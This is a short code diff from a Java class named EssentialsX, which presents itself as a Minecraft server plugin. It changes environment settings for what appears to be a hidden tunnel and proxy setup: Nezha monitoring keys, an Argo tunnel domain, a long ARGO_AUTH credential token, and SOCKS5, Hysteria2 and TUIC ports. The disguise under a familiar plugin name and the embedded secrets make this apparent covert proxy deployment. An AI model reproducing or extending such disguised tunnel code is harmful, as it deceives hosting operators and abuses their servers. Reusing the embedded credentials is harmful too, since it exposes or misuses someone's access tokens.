@@ -78,9 +78,9 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
-        env.put("ARGO_PORT", "8081");
-        env.put("ARGO_DOMAIN", "weirdhost-krf8.o9o.pp.ua");
-        env.put("ARGO_AUTH", "eyJhIjoiZTgwYTRmNDYzYWVmMzVlNWVhYWNhOWRlZjY3NjE3ZDciLCJ0IjoiZDc0YmM4ZmUtODk1Zi00YzIxLTgwNzItMmJhNWM0ZjZlMDYwIiwicyI6Ik56ZzROREl6WlRNdE1ETXpPUzAwTXpka0xUZ3daVFV0TkRFNVlXTTNZalZtTm1JMSJ9");
+        env.put("ARGO_PORT", "8009");
+        env.put("ARGO_DOMAIN", "weirdhost-krf6.o9o.pp.ua");
+        env.put("ARGO_AUTH", "eyJhIjoiZTgwYTRmNDYzYWVmMzVlNWVhYWNhOWRlZjY3NjE3ZDciLCJ0IjoiMDNiNTE3NzktYTVkNC00MTUzLTgyYjAtYjZhM2I0ZTZkYWY4IiwicyI6Ik5UZGpZVEV6TUdJdE9HWTVNQzAwTnpjM0xUZzRNVE10T1RWaE9ERTRNMlF3TXpjNCJ9");
         env.put("S5_PORT", "25359");
         env.put("HY2_PORT", "25359");
         env.put("TUIC_PORT", "");
